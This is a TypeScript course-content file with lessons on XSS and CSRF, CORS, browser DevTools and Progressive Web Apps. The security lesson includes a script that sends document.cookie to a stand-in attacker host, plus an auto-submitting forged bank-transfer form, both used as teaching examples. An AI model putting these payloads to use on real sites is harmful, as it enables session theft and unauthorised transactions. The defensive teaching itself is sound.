import type { Topic } from "../../types/content";

export const webFundamentalsAdvancedTopics: Topic[] = [
  {
    id: "web-security-basics",
    title: "Web Security Basics",
    level: "advanced",
    description:
      "Two of the most common ways attackers abuse a site's trust in its own content or its users, and why they work.",
    explanation: `
Many web security problems come down to trust. A browser generally trusts
whatever content it's given, and a server generally trusts requests that
look like they come from a logged-in user. Attackers exploit this in two
classic ways.

**Cross-site scripting (XSS).** Say a site shows user comments to other
visitors exactly as typed. An attacker posts a comment that's really a
bit of JavaScript. If the site displays it without neutralizing it, the
script runs in every visitor's browser as if the *site itself* wrote it.
It can steal their session, read their data, or act as them. XSS means
sneaking attacker code into a page so it runs with the page's trust and
permissions.

**Cross-site request forgery (CSRF).** Say you're logged into your bank
in one tab and visit a malicious page in another. That page secretly
sends your bank a request, like a money transfer, from your browser. Your
browser attaches your login cookie to *any* request to the bank's domain,
whichever tab sent it. So the bank sees what looks like a legitimate,
authenticated request from you, and might act on it. CSRF means tricking
an already-logged-in browser into sending a request the user never
intended.

In both, something runs or is trusted that the user never knowingly
approved.
  `.trim(),
    analogy:
      "XSS is like a forger slipping a fake page into a book that everyone reads as the trusted author's words. CSRF is like someone getting you to sign a blank check without noticing, then filling in any amount, knowing your signature (your login session) is valid.",
    examples: [
      {
        title: "An XSS vulnerability",
        code: `// Comment submitted by an attacker:
<script>fetch('https://evil.example/steal?cookie=' + document.cookie)</script>

// If the site inserts this directly into the page HTML unescaped,
// this script runs in every visitor's browser who views the comment.`,
        explanation:
          "The attacker doesn't hack the server. They get the site to serve their script to other victims, where it runs with full access to the page, including its cookies.",
        walkthrough: [
          { code: "<script>...</script>", explanation: "Not plain text: a real, executable script submitted as an ordinary comment." },
          { code: "fetch('https://evil.example/steal?...')", explanation: "Sends the victim's session data to the attacker's server." },
          { code: "document.cookie", explanation: "Reads the page's cookies, which may include the victim's session identifier if they're logged in." },
        ],
      },
      {
        title: "A CSRF request",
        code: `<!-- Hosted on a malicious, unrelated site -->
<form action="https://bank.example/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker-account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById("f").submit();</script>`,
        explanation:
          "Just visiting this page silently submits a form to the bank's real server. If the victim is logged into the bank in the same browser, their session cookie is attached automatically, and the bank may treat it as a legitimate request.",
      },
    ],
    howItWorks: `
**XSS** works because a browser can't tell "content the site's developers
wrote" from "user content that happens to look like code," unless the
site neutralizes special characters before showing user content (called
**escaping** or **sanitizing**).

**CSRF** works because browsers attach a domain's cookies to *every*
request to that domain, whatever page or tab started it. The browser has
no built-in way to know the user didn't intend the request.
  `.trim(),
    whyItExists: `
Web trust runs on simple patterns: content in the page is treated as the
page's own, and a request with valid cookies is treated as the real user.
Attackers can exploit these easily unless a site defends against them
directly.

Knowing how each attack works makes the defenses (escaping output,
requiring an unpredictable token on sensitive requests) make sense
instead of feeling like arbitrary rules.
  `.trim(),
    whenToUse: `
Think about XSS anywhere your site shows content that came from a user (a
comment, a username, a search term) rather than from your developers.
Think about CSRF anywhere a request triggers a meaningful action
(changing a password, moving money, deleting data), especially if only
cookies identify the user.
  `.trim(),
    whenNotToUse: `
These concerns belong to the browser model of cookies and page content.
They don't map directly to systems without a browser or shared session
trust, like a server-to-server API that signs every call with a token.
Those systems have their own, different security concerns.
  `.trim(),
    commonMistakes: [
      "Showing user-submitted content in the page without escaping special characters, which opens the door to XSS.",
      "Assuming a valid session cookie proves the user meant to send the request, which is exactly what CSRF exploits.",
      "Bolting security on at the end instead of considering it whenever user input is shown or a sensitive action runs.",
    ],
    exercises: [
      { difficulty: "Easy", prompt: "In your own words, explain the difference between what XSS and CSRF let an attacker do." },
      { difficulty: "Medium", prompt: "A comment form inserts user input directly into the page's HTML. Describe exactly what a malicious comment could do to other visitors." },
      { difficulty: "Hard", prompt: "Design a simple defense for a form-submission endpoint that stops the CSRF example above, and explain why it works." },
    ],
    interviewQuestions: [
      { question: "What is cross-site scripting (XSS), in plain terms?", answer: "Getting a site to show and run attacker code as if it were the site's own trusted content, usually by injecting it into content the site later renders unescaped." },
      { question: "What is cross-site request forgery (CSRF), in plain terms?", answer: "Tricking a victim's browser into sending a request to a site they're logged into. It looks legitimate because the browser attaches their session cookie automatically." },
      { question: "Why does a valid session cookie alone not prove a request was intentional?", answer: "Browsers attach cookies to any request to a matching domain, whatever page triggered it. An attacker's page can make the browser send a fully authenticated-looking request the user never meant to make." },
    ],
    relatedTopics: ["cors", "browser-storage"],
    keywords: ["xss", "csrf", "security", "cross-site scripting", "cross-site request forgery"],
  },
  {
    id: "cors",
    title: "CORS",
    level: "advanced",
    description:
      "Why a browser stops a page from freely reading another site's responses, and how that site's server can allow it.",
    explanation: `
Browsers are deliberately wary of a page that fetches data from a
*different* site than the one it came from. If a page at
\`shopping.example\` requests \`bank.example\`, the browser blocks the page
from reading the response by default, even if the request went through.
There's no reason to assume \`bank.example\` wants another site reading
its data on a visitor's behalf.

This default is the **same-origin policy**, a core browser security
protection. But many legitimate cases need cross-site requests, like a
public weather API that lots of sites call. So a server needs a way to
say "this other site may read my responses."

That mechanism is **CORS** (Cross-Origin Resource Sharing). A server that
allows other origins sends response headers saying so. The browser
checks them before letting the page's JavaScript read the response.
Without the right headers, the browser blocks access even though the
server already sent the response.
  `.trim(),
    analogy:
      "It's like a package delivered to your door that you (the browser) won't let anyone inside open unless the sender included a note saying 'yes, this address may open it.'",
    examples: [
      {
        title: "A blocked cross-origin request",
        code: `// Running on https://myapp.example
fetch("https://api.otherservice.example/data")
  .then(res => res.json())
  .catch(err => console.error(err));
// Console: blocked by CORS policy — no
// 'Access-Control-Allow-Origin' header present`,
        explanation:
          "The request may have reached the server and gotten a response, but the browser won't give the data to this page's JavaScript because the server didn't allow this origin.",
        walkthrough: [
          { code: "https://myapp.example", explanation: "The 'origin' the script runs from: protocol, domain, and port together." },
          { code: 'fetch("https://api.otherservice.example/data")', explanation: "A request to a different origin (a different domain), so the browser runs a CORS check." },
          { code: "blocked by CORS policy", explanation: "The browser withheld the response because the server didn't grant permission to this origin." },
        ],
      },
      {
        title: "A server opting in",
        code: `HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://myapp.example
Content-Type: application/json

{"forecast": "sunny"}`,
        explanation:
          "This header names the exact origin allowed to read the response, telling the browser that https://myapp.example may access the data. A value of * would allow any origin.",
      },
    ],
    howItWorks: `
When JavaScript on one origin requests another origin, the browser adds
the page's origin to the request. It then checks the response headers
before exposing the body to the page.

If the response has an \`Access-Control-Allow-Origin\` header matching the
requesting origin (or a wildcard for any origin), the page can read it.
Otherwise the browser blocks access, even though the network request may
have completed.

For some kinds of requests, the browser first sends an automatic
"preflight": a separate request asking the server what's allowed, before
the real one.
  `.trim(),
    whyItExists: `
The same-origin policy is essential for security but too strict for the
many legitimate cases that share data across origins: public APIs,
third-party widgets, services split across domains. CORS lets servers
opt in to loosening it only where they choose, instead of browsers
either blocking everything cross-origin or dropping the protection.
  `.trim(),
    whenToUse: `
You need CORS whenever a browser frontend on one origin calls an API on
another, a common setup. You configure it on the *server*, since the
server's headers grant permission.
  `.trim(),
    whenNotToUse: `
CORS doesn't apply to server-to-server requests: no browser, so no
same-origin policy. It also doesn't replace authentication or
authorization. Allowing an origin only controls whether a browser can
read the response, not whether the request should be trusted or
permitted.
  `.trim(),
    commonMistakes: [
      "Assuming a CORS error means the request never reached the server, when the server may have processed it fine. The browser only blocks reading the response.",
      "Setting Access-Control-Allow-Origin to * on an API that also handles sensitive, authenticated requests, which can be too permissive.",
      "Thinking CORS protects the server, when it's a browser-enforced protection for the calling page and its users.",
    ],
    exercises: [
      { difficulty: "Easy", prompt: "In your own words, explain why the same-origin policy stops a page's JavaScript from reading a cross-origin response by default." },
      { difficulty: "Medium", prompt: "A fetch request fails with a CORS error. Name the response header the server needs to add to fix it, with the specific allowed origin." },
      { difficulty: "Hard", prompt: "Explain what a CORS preflight request is, why some requests need it and others don't, and sketch what the server must respond with to satisfy it." },
    ],
    interviewQuestions: [
      { question: "What problem does the same-origin policy solve?", answer: "By default it stops a page's JavaScript from reading responses from another origin. That protects users from malicious pages silently reading data from other sites they're logged into." },
      { question: "What is CORS, and who configures it?", answer: "Cross-Origin Resource Sharing: the server sends response headers that let specific other origins read its responses. It's configured on the server, not the requesting page." },
      { question: "If a request fails due to CORS, did the server actually receive it?", answer: "Often yes. The request can reach the server and be processed normally; the browser just blocks the page's JavaScript from reading the response because the server didn't send the right permission header." },
    ],
    prerequisites: ["how-the-web-works"],
    relatedTopics: ["web-security-basics", "how-the-web-works"],
    keywords: ["cors", "same-origin policy", "cross-origin", "access-control-allow-origin", "preflight"],
  },
  {
    id: "browser-devtools",
    title: "Browser DevTools & Debugging",
    level: "advanced",
    description:
      "The browser's built-in tools for inspecting and debugging what a page is really doing, beyond what it shows.",
    explanation: `
Every major browser includes **DevTools**, usually opened with a keyboard
shortcut or a right-click "Inspect." The visible page often isn't enough
to understand or fix a problem. You need to see the structure underneath,
watch code run, inspect network traffic, and catch errors as they happen.

The panels you'll use most:

- **Elements** shows the live DOM tree (not the original HTML source) and the computed CSS for the selected element. You can edit either on the fly to experiment.
- **Console** shows messages logged by JavaScript and reports errors and warnings as they happen. It's also a live prompt for running code against the current page.
- **Network** lists every request the page made: what was requested, how long it took, and what came back. It's usually the first place to look when something won't load or loads slowly.
- **Sources** shows the JavaScript files running on the page and lets you set **breakpoints**, points where execution pauses so you can inspect variables and step through code line by line instead of guessing from logs.
  `.trim(),
    analogy:
      "DevTools is like opening the hood of a car instead of looking at the dashboard. The dashboard (the rendered page) tells you the car is running; under the hood you can see which part is misbehaving.",
    examples: [
      {
        title: "Inspecting and editing the live DOM",
        code: `// In the Elements panel, selecting an element shows
// its live HTML and the CSS rules currently applied to it.
// Editing text or a style there updates the page instantly,
// without changing any actual file on disk.`,
        explanation:
          "A quick way to test a visual tweak, like a new color or margin, before writing it into a CSS file. You're editing the live DOM, not the source.",
      },
      {
        title: "Setting a breakpoint in Sources",
        code: `function calculateTotal(items) {
  let total = 0;
  for (const item of items) {
    total += item.price; // <- breakpoint set on this line
  }
  return total;
}`,
        explanation:
          "A breakpoint on the marked line pauses execution each time that line is about to run, so you can check total and item right there instead of sprinkling console.log everywhere.",
        walkthrough: [
          { code: "function calculateTotal(items) {", explanation: "The function you're trying to understand or debug." },
          { code: "total += item.price; // breakpoint", explanation: "Click this line number in the Sources panel to pause execution here every time it runs." },
          { code: "(paused execution)", explanation: "While paused, inspect every variable in scope and step forward one line at a time to watch them change." },
        ],
      },
    ],
    howItWorks: `
DevTools is built into the browser and has privileged access to the
page's internals. It can:

- read the live DOM and computed styles (Elements)
- log messages, catch errors, and run any code in the page's context (Console)
- watch every network request the page makes (Network)
- pause JavaScript at specific lines (Sources)

The page doesn't need any special debugging code; the browser offers
this for every page by default.
  `.trim(),
    whyItExists: `
Looking at the rendered page isn't enough to build or fix anything
nontrivial. You need to see structure, styling, network activity, and
code execution that never show up on screen. Because every browser has
these tools for any page, debugging is a normal part of web work, not
something that needs separate specialized tools.
  `.trim(),
    whenToUse: `
- **Elements:** something looks wrong and you need the applied styles.
- **Console:** checking for errors or quickly testing a snippet.
- **Network:** something isn't loading, loads slowly, or you need to see what a request sent or received.
- **Sources and breakpoints:** you need to see exactly what some JavaScript does, step by step.
  `.trim(),
    whenNotToUse: `
DevTools is for debugging and inspection, not permanent changes. Live
edits in the Elements or Sources panel vanish on reload, since they never
touch the real source files. For intended, permanent behavior, the source
code is the source of truth.
  `.trim(),
    commonMistakes: [
      "Editing something in the Elements panel and expecting it to survive a reload, when live edits vanish on refresh.",
      "Skipping the Network panel when debugging a 'blank page' or missing data, when a failed or slow request is often the cause.",
      "Relying only on scattered console.log statements for a tricky bug instead of pausing at a breakpoint to inspect state.",
    ],
    exercises: [
      { difficulty: "Easy", prompt: "Open DevTools on any webpage, select an element in the Elements panel, and find one CSS rule applied to it." },
      { difficulty: "Medium", prompt: "Open the Network panel, reload a page, and find the largest resource downloaded." },
      { difficulty: "Hard", prompt: "Set a breakpoint in a JavaScript function on a real page, trigger it, and step through the code line by line while watching a variable change." },
    ],
    interviewQuestions: [
      { question: "What's the difference between the Elements panel and viewing a page's HTML source?", answer: "The Elements panel shows the live DOM, which JavaScript may have changed since load. 'View source' shows the original HTML as the server first sent it." },
      { question: "What is a breakpoint, and why use one instead of console.log?", answer: "A breakpoint pauses JavaScript at a specific line so you can inspect every variable and step through the code. That's often faster and more thorough than adding and removing log statements." },
      { question: "When would you check the Network panel while debugging?", answer: "When something isn't appearing, is loading slowly, or you need to check exactly what a request sent or received. It's the main place to see all of a page's network activity." },
    ],
    relatedTopics: ["the-dom", "browser-rendering", "web-performance-basics"],
    keywords: ["devtools", "debugging", "elements panel", "console", "network panel", "breakpoints"],
  },
  {
    id: "progressive-web-apps",
    title: "Progressive Web Apps (PWA)",
    level: "advanced",
    description:
      "What lets a website act more like a native app: installable, working offline, and launchable from a home screen.",
    explanation: `
A regular website needs a live connection and lives inside a browser
tab. Some sites go further: you can "install" them like a native app,
they keep working (at least partly) offline, and they get their own icon
outside the browser. These are **Progressive Web Apps**, or **PWAs**.
"Progressive" because they start as normal websites and add app-like
features on top, with no separate app to build.

Two pieces make this work:

- A **manifest file** is a small JSON file describing the site the way an app describes itself: name, icon, color scheme, and how it looks when launched (like hiding the address bar). It lets the browser offer to "install" the site and makes the icon behave like any other app icon.
- A **service worker** is a script the browser can run in the background, separate from any tab, even when no tab for the site is open. It can intercept the page's network requests and decide how to respond, including serving a saved response instead of using the network. That's what lets a PWA keep working, at least partly, offline.
  `.trim(),
    analogy:
      "A manifest is a business card the site hands the operating system: 'here's my name, my icon, and how to launch me.' A service worker is a receptionist who keeps working even when the office (an open tab) is empty, with a filing cabinet of past documents to hand out instantly instead of always sending out for a fresh copy.",
    examples: [
      {
        title: "A basic web app manifest",
        code: `{
  "name": "My Task App",
  "short_name": "Tasks",
  "start_url": "/",
  "display": "standalone",
  "icons": [
    { "src": "icon-192.png", "sizes": "192x192", "type": "image/png" }
  ]
}`,
        explanation:
          "Linked from the page's HTML, this JSON file tells the browser the site can be installed as an app, which icon to use, and to open without the usual address bar (display: standalone).",
        walkthrough: [
          { code: '"name": "My Task App"', explanation: "The full app name shown during installation and in app switchers." },
          { code: '"display": "standalone"', explanation: "Launch the app in its own window, without browser chrome like the address bar." },
          { code: '"icons": [...]', explanation: "The icon image(s) for the home screen or app launcher, at the given sizes." },
        ],
      },
      {
        title: "A service worker caching a response",
        code: `self.addEventListener("fetch", (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) => {
      return cached || fetch(event.request);
    })
  );
});`,
        explanation:
          "The service worker intercepts every request the page makes. If a matching response is in the cache, it's returned immediately, even offline; otherwise it falls back to a real network request.",
      },
    ],
    howItWorks: `
When a page registers a service worker, the browser installs it to run in
the background, independent of any tab, and keeps it registered across
visits. From then on it can intercept the page's requests before they
reach the network and decide whether to serve a cached response, fetch a
fresh one, or mix both. That's what enables offline support.

The manifest is used separately, mainly at install time, to tell the
operating system how to present the app once the user installs it.
  `.trim(),
    whyItExists: `
PWAs close the gap between websites and native apps without building and
maintaining a separate native app per platform. Offline support and
installability used to be native-only. Service workers and manifests let
an ordinary website opt into them with technology already in the
browser.
  `.trim(),
    whenToUse: `
Consider a PWA when users would benefit from installing your site like an
app, or when it must stay at least partly usable without a reliable
connection. Good fits: note-taking apps, dashboards people check often,
and tools used where connectivity is patchy.
  `.trim(),
    whenNotToUse: `
A simple content site with no need for offline access or an app-like
presence gains little from a service worker and manifest. Service workers
also add real complexity around caching and updates: stale cached content
can confuse users if it isn't managed carefully. Don't adopt them
casually.
  `.trim(),
    commonMistakes: [
      "Caching aggressively in a service worker with no plan for invalidating old data, leaving users stuck with stale content.",
      "Assuming a manifest alone makes a site work offline. Offline support comes from the service worker, not the manifest.",
      "Forgetting that a registered service worker stays installed and keeps intercepting requests on later visits, even after the tab is closed, which can surprise you during development.",
    ],
    exercises: [
      { difficulty: "Easy", prompt: "Write a basic web app manifest for a sample site, with a name, icon, and display mode." },
      { difficulty: "Medium", prompt: "Register a simple service worker on a test page and use DevTools to confirm it runs independently of the open tab." },
      { difficulty: "Hard", prompt: "Extend a service worker to cache a page's core files on install and serve them when the network is unavailable. Test it by going offline in DevTools." },
    ],
    interviewQuestions: [
      { question: "What are the two core pieces that make a website installable and offline-capable as a PWA?", answer: "A web app manifest, which describes the app's name, icon, and launch appearance, and a service worker, which can intercept network requests and serve cached responses without a connection." },
      { question: "What is a service worker, and how is it different from regular page JavaScript?", answer: "A script that runs in the background, independent of any open tab, and can intercept and respond to the page's network requests. Regular page scripts only run while their tab is open." },
      { question: "Does adding a manifest file alone make a site work offline?", answer: "No. The manifest only controls installability and how the installed app looks. Offline behavior comes from a service worker intercepting requests and serving cached responses." },
    ],
    prerequisites: ["browser-devtools", "web-performance-basics"],
    relatedTopics: ["browser-devtools", "browser-storage"],
    keywords: ["pwa", "progressive web app", "service worker", "manifest", "offline", "installable"],
  },
];
